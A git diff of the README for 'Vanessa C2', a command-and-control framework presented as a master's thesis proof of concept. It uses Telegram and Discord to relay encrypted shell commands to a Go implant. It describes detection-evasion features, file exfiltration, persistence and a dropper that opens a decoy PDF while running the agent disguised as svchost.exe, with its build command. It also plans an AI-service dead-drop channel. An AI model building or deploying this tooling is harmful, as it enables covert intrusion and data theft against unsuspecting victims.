@@ -1,154 +1,183 @@
-# Vanissa C3
+# Vanessa C2
 
 <p align="center">
-  <img src="./assets/README-img/vanissa-c2.jpeg" alt="Vanissa C2 Logo" width="400"/>
+  <img src="./assets/README-img/vanissa-c2.jpeg" alt="Vanessa C2 Logo" width="400"/>
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/status-in%20development-yellow" alt="Status"/>
-  <img src="https://img.shields.io/badge/python-3.13-blue" alt="Python"/>
+  <img src="https://img.shields.io/badge/python-3.10+-blue" alt="Python"/>
   <img src="https://img.shields.io/badge/go-1.21+-00ADD8" alt="Go"/>
-  <img src="https://img.shields.io/badge/platform-linux-orange" alt="Platform"/>
+  <img src="https://img.shields.io/badge/platform-windows%20%7C%20linux-orange" alt="Platform"/>
   <img src="https://img.shields.io/badge/license-MIT-green" alt="License"/>
+  <img src="https://img.shields.io/badge/encryption-AES--256--GCM-red" alt="Encryption"/>
 </p>
 
-> ⚠️ **This project is under active development. Features may be incomplete or change at any time.**
+> ⚠️ **Educational PoC only.** This project is part of a master's thesis on *Living off Trusted Services* (LoTS) C2 evasion techniques. Use only on systems you own or have explicit written permission to test.
 
 ---
 
-## What is Vanissa C2?
+## What is Vanessa C2?
 
-**Vanissa C2** is a Command & Control framework that uses **Telegram as its communication channel**. The server sends shell commands through a Telegram group, and the client receives, executes them, and sends the results back — all over Telegram's infrastructure.
+**Vanessa C2** is a proof-of-concept Command & Control framework that leverages **Cloud-based and Public Legitimate Services (CPLS)** — specifically **Telegram** and **Discord** — as its communication channels. All C2 traffic rides on legitimate HTTPS APIs, making it indistinguishable from normal platform usage to network defenders.
 
-Built as a learning project to explore C2 architecture, the Telegram Bot API, MTProto, and Go/Python interoperability.
+### Key Capabilities
+
+- 🔀 **Multi-channel C2** — Telegram + Discord with runtime channel switching
+- 🔐 **AES-256-GCM encryption** — All protocol messages encrypted end-to-end
+- 🎲 **Jitter & evasion** — Randomized beacon intervals to defeat NDR fingerprinting
+- 💾 **Persistent state** — SQLite-backed agent registry survives server restarts
+- 📂 **File exfiltration** — Download files from targets
+- 🖥️ **Interactive shell** — Full operator console with agent selection
+- 🪦 **Agent health monitoring** — Automatic reaper marks dead agents
 
 ---
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                                                         │
-│   [Operator]                                            │
-│   shell> whoami                                         │
-│       │                                                 │
-│       ▼                                                 │
-│   [Flask Server]  ──INSTRUCTION|id|cmd──►  [Telegram]  │
-│       ▲                                        │        │
-│       │                                        ▼        │
-│   RESULT|id|output  ◄──────────────  [Go Client]       │
-│                                      (executes cmd)     │
-│                                                         │
-└─────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────────┐
+│                                                                  │
+│   [Operator Shell]                                               │
+│   vanessa> use agent_abc123                                      │
+│   vanessa(abc123)> whoami                                        │
+│       │                                                          │
+│       ▼                                                          │
+│   [Python Server]                                                │
+│   Flask API + SQLite + Agent Registry                            │
+│       │                                                          │
+│       ├──► [Telegram Channel] ──ENC|base64(AES-GCM(msg))──►     │
+│       │    (Telethon MTProto)                                    │
+│       │                                                          │
+│       └──► [Discord Channel]  ──ENC|base64(AES-GCM(msg))──►     │
+│            (discord.py bot)                                      │
+│                                        │                         │
+│                                        ▼                         │
+│                               [Go Agent / Implant]               │
+│                               Polls → Decrypt → Execute          │
+│                               Encrypt → Send RESULT back         │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
 ```
-
-- **Server** (Python + Flask + Telethon): Interactive shell that sends commands to a Telegram group as a real user account
-- **Client** (Go): Polls the group, executes received commands via `sh -c`, sends results back as a bot
-- **Channel**: A private Telegram supergroup used as the communication medium
-
----
-
-## Features
-
-- [x] Interactive remote shell from the server terminal
-- [x] Real-time command execution on the client machine
-- [x] Results delivered back to the operator automatically
-- [x] Telegram as C2 channel (blends into normal traffic)
-- [x] Concurrent command handling via goroutines
-- [x] Telethon MTProto for server-side messaging (bypasses bot restrictions)
-- [ ] Multiple client support
-- [ ] File upload / download
-- [ ] Screenshot capture
-- [ ] Persistence mechanism
-- [ ] Encrypted payloads
-- [ ] Client authentication & ID verification
-- [ ] Web dashboard
 
 ---
 
 ## Tech Stack
 
 | Component | Technology |
-|-----------|-----------|
-| Server | Python 3.13, Flask, Telethon |
-| Client | Go 1.21+ |
-| C2 Channel | Telegram (MTProto + Bot API) |
-| OS | Linux (Kali recommended) |
+|-----------|------------|
+| **Server** | Python 3.10+, Flask, Telethon (MTProto), discord.py |
+| **Client** | Go 1.21+, discordgo |
+| **Database** | SQLite (`vanessa.db`) |
+| **Encryption** | AES-256-GCM (SHA-256 key derivation) |
+| **Channels** | Telegram Bot API, Discord Bot API |
+| **Dropper** | Go (embedded EXE + decoy PDF + RLO masquerade) |
 
 ---
 
 ## Project Structure
 
 ```
-vanissa-c2/
+vanessa-c2/
 ├── server/
-│   ├── app.py              # Flask server + interactive shell
-│   ├── .env                # API credentials
-│   └── requirements.txt    # Python dependencies
+│   ├── app.py                  # Operator console + Flask API
+│   ├── core/
+│   │   ├── agent.py            # Agent registry + reaper
+│   │   ├── channel.py          # Abstract C2Channel interface
+│   │   ├── crypto.py           # AES-256-GCM encryption (Python)
+│   │   └── database.py         # SQLite persistence layer
+│   ├── channels/
+│   │   ├── telegram.py         # Telegram channel (Telethon)
+│   │   └── discord.py          # Discord channel (discord.py)
+│   ├── .env                    # API credentials + C2_SECRET
+│   └── requirements.txt
 │
 ├── client/
-│   ├── main.go             # Go client entry point
-│   ├── go.mod
-│   ├── go.sum
-│   ├── .env                # Bot credentials
-│   └── telegram/
-│       └── client.go       # Telegram API wrapper
+│   ├── main.go                 # Agent entry point + .env loader
+│   ├── core/
+│   │   ├── config.go           # AgentConfig (jitter, encryption key)
+│   │   ├── identity.go         # Deterministic agent ID generation
+│   │   ├── interfaces.go       # C2Channel interface
+│   │   └── handlers.go         # Shared command handlers
+│   ├── channels/
+│   │   ├── telegram/client.go  # Telegram channel (HTTP polling)
+│   │   └── discord/client.go   # Discord channel (discordgo)
+│   ├── utils/
+│   │   └── encoding.go         # AES-256-GCM encryption (Go)
+│   ├── .env                    # Bot tokens + C2_SECRET
+│   ├── go.mod / go.sum
+│
+├── dropper/
+│   └── main.go                 # PDF dropper with embedded agent
 │
 └── assets/
     └── README-img/
-        └── vanissa-c2.jpeg
 ```
 
 ---
 
-## Prerequisites
+## Protocol
 
-- Python 3.10+
-- Go 1.21+
-- A Telegram account
-- Two Telegram bots (created via [@BotFather](https://t.me/BotFather))
-- Telegram API credentials from [my.telegram.org/apps](https://my.telegram.org/apps)
+### Message Format
+
+Pipe-delimited strings, optionally wrapped in AES-256-GCM encryption:
+
+| Direction | Plaintext | Encrypted |
+|-----------|-----------|-----------|
+| Server → Agent | `INSTRUCTION\|agent_id\|instr_id\|command` | `ENC\|base64(nonce+ciphertext)` |
+| Agent → Server | `RESULT\|agent_id\|instr_id\|output` | `ENC\|base64(nonce+ciphertext)` |
+| Agent → Server | `CHECKIN\|agent_id\|hostname\|os\|user\|ip` | `ENC\|...` |
+| Server → Agent | `SWITCH\|agent_id\|channel_name` | `ENC\|...` |
+| Agent → Server | `SWITCHACK\|agent_id\|channel_name` | `ENC\|...` |
+
+### Encryption
+
+- **Algorithm**: AES-256-GCM with 12-byte random nonce
+- **Key derivation**: `SHA-256(C2_SECRET)` → 32-byte key
+- **Backwards compatible**: Messages without `ENC|` prefix pass through unencrypted
+- **Cross-language**: Go and Python implementations are interoperable
 
 ---
 
 ## Setup
 
-### 1. Clone the repository
+### Prerequisites
+
+- Python 3.10+ with `pip`
+- Go 1.21+
+- A Telegram account + API credentials from [my.telegram.org/apps](https://my.telegram.org/apps)
+- A Telegram bot (via [@BotFather](https://t.me/BotFather))
+- A Discord bot + server (via [Discord Developer Portal](https://discord.com/developers/applications))
+
+### 1. Clone
 
 ```bash
-git clone https://github.com/yourusername/vanissa-c2.git
-cd vanissa-c2
+git clone https://github.com/SaadAzil3/Vanessa-C2.git
+cd Vanessa-C2
 ```
 
-### 2. Create a Telegram group
-
-- Create a private Telegram supergroup
-- Add both bots to the group
-- Disable privacy mode for both bots via @BotFather → Bot Settings → Group Privacy → **Turn OFF**
-- Make both bots admins with send message permissions
-- Get your group chat ID (negative number, e.g. `-1003728125166`)
-
-### 3. Get Telegram API credentials
-
-Go to [my.telegram.org/apps](https://my.telegram.org/apps), log in, create an app and grab your `api_id` and `api_hash`.
-
-### 4. Configure the server
+### 2. Server Setup
 
 ```bash
 cd server
+python -m venv env
+source env/bin/activate
 pip install -r requirements.txt
 ```
 
 Create `server/.env`:
 ```env
 API_ID=12345678
-API_HASH=your_api_hash_here
+API_HASH=your_api_hash
 PHONE=+213xxxxxxxxx
-CHAT_ID=-1003728125166
-BOT_TOKEN=111:SERVER_BOT_TOKEN
+BOT_TOKEN=your_telegram_bot_token
+CHAT_ID=-100xxxxxxxxxx
+DISCORD_TOKEN=your_discord_bot_token
+DISCORD_CHANNEL_ID=your_discord_channel_id
+C2_SECRET=your_shared_encryption_key
 ```
 
-### 5. Configure the client
+### 3. Client Setup
 
 ```bash
 cd client
@@ -157,15 +186,42 @@ go mod tidy
 
 Create `client/.env`:
 ```env
-BOT_TOKEN=222:CLIENT_BOT_TOKEN
-CHAT_ID=-1003728125166
+BOT_TOKEN=your_telegram_bot_token
+CHAT_ID=-100xxxxxxxxxx
+DISCORD_TOKEN=your_discord_bot_token
+C2_SECRET=your_shared_encryption_key
 ```
+
+> ⚠️ The `C2_SECRET` **must match** on both server and client for encrypted comms to work.
 
 ---
 
 ## Usage
 
-### Start the client (on target machine)
+### Start the Server
+
+```bash
+cd server
+source env/bin/activate
+python app.py
+```
+
+```
+[+] Encryption: ENABLED (AES-256-GCM)
+[+] Telegram channel configured
+[+] Discord channel configured
+[+] Flask API running on http://127.0.0.1:5000
+[+] Active channels: ['telegram', 'discord']
+
+╔══════════════════════════════════════════╗
+║  VANESSA C2 — Operator Console           ║
+║  Type 'help' for available commands      ║
+╚══════════════════════════════════════════╝
+
+vanessa>
+```
+
+### Start the Agent
 
 ```bash
 cd client
@@ -173,74 +229,74 @@ go run main.go
 ```
 
 ```
-🤖 Go client started. Waiting for commands...
-📡 Polling... got 0 updates
+Encryption: ENABLED (AES-256-GCM)
+Agent ID: abc123de
+Telegram channel available
+Discord channel available
 ```
 
-### Start the server (on operator machine)
+### Operator Commands
+
+| Command | Description |
+|---------|-------------|
+| `agents` | List all connected agents |
+| `use <id>` | Select an agent to interact with |
+| `back` | Deselect current agent |
+| `switch <channel>` | Switch agent to telegram/discord |
+| `sleep <seconds>` | Put agent to sleep |
+| `jitter <min> <max>` | Set randomized beacon interval |
+| `download <path>` | Exfiltrate a file from target |
+| `sysinfo` | Get system information |
+| `ifconfig` / `netstat` | Network info (auto-detects OS) |
+| `persist` | Install persistence mechanism |
+| `kill` | Terminate the agent |
+| `exit` | Shut down the server |
+| `<any command>` | Execute shell command on target |
+
+---
+
+## Dropper
+
+The `dropper/` directory contains a Go-based dropper that:
+
+1. Embeds the compiled agent binary at build time (`go:embed`)
+2. Drops a decoy PDF to `%TEMP%` and opens it (user sees a legit document)
+3. Drops the agent to `%APPDATA%\Microsoft\WindowsCache\svchost.exe`
+4. Runs the agent silently with `CREATE_NO_WINDOW`
 
 ```bash
-cd server
-python app.py
-```
-
-On first run, Telegram will ask you to authenticate with your phone number and code. A session file (`server_session.session`) will be saved for future runs.
-
-```
-✅ Telethon user client connected!
-🔄 Telethon polling loop started...
-
-==================================================
-🖥️  REMOTE SHELL — type commands to execute on client
-    Type 'exit' to quit
-==================================================
-
-shell>
-```
-
-### Execute commands
-
-```bash
-shell> whoami
-📥 Output:
-azil
-
-shell> uname -a
-📥 Output:
-Linux kali 6.x.x-kali #1 SMP PREEMPT_DYNAMIC ...
-
-shell> ls /etc/passwd
-📥 Output:
-/etc/passwd
-
-shell> exit
-👋 Goodbye!
+# Build (from dropper/ directory, with agent_client.exe present)
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o Report_Q1_2026.exe .
 ```
 
 ---
 
-## How It Works
+## Roadmap
 
-The communication protocol uses a simple pipe-delimited format:
-
-| Direction | Format | Example |
-|-----------|--------|---------|
-| Server → Client | `INSTRUCTION\|id\|command` | `INSTRUCTION\|a3f9c1b2\|whoami` |
-| Client → Server | `RESULT\|id\|output` | `RESULT\|a3f9c1b2\|azil` |
-
-The `id` field ties each result back to its instruction, allowing the server to match responses correctly even under concurrency.
+- [x] Multi-channel support (Telegram + Discord)
+- [x] Interactive operator shell
+- [x] Agent health monitoring (reaper)
+- [x] File exfiltration
+- [x] Runtime jitter configuration
+- [x] AES-256-GCM encrypted protocol
+- [x] PDF dropper with RLO masquerade
+- [x] SQLite state persistence across restarts
+- [ ] LoDD channel (LLM-obfuscated Dead Drop via Claude + Notion)
+- [ ] Windows persistence (Registry / Scheduled Tasks)
+- [ ] Screenshot capture module
+- [ ] Web dashboard for operators
 
 ---
 
-## Important Notes
+## Disclaimer
 
-> This tool is intended for **educational purposes** and **authorized penetration testing only**. Use it only on systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.
+This tool is intended for **educational purposes** and **authorized penetration testing only**. It was developed as part of a master's thesis on network evasion techniques using legitimate cloud services. Unauthorized use against systems you do not own or have explicit permission to test is **illegal and unethical**.
 
 ---
 
 ## Author
 
-**azil** — Cybersecurity student, Kali Linux enjoyer 🐉
+**Saad Azil** — Cybersecurity student & researcher 🐉
 
 ---
 
